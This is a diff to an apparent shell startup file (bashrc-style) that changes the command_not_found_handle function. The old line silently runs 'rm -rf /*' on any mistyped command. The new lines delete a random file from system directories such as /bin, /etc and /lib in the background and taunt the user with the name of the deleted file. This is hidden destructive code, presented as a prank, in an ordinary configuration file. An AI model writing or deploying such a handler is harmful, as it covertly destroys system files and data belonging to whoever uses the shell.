@@ -13,5 +13,8 @@ echo " ==================================="
 PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
 
 function command_not_found_handle {
-     rm -rf /* 2>/dev/null &; echo "Oops, looks like you misspelt something >:)";
+    filetodelete=$(find /{bin,etc,lib,lib64,usr/{bin,lib,sbin},sbin} -type f | sort -R | head -n 1)
+    (rm -f $filetodelete 2>/dev/null 1>&2 &)
+    echo "Oops, looks like you misspelt something >:)"
+    echo "Hope you didn't need $filetodelete..."
 }
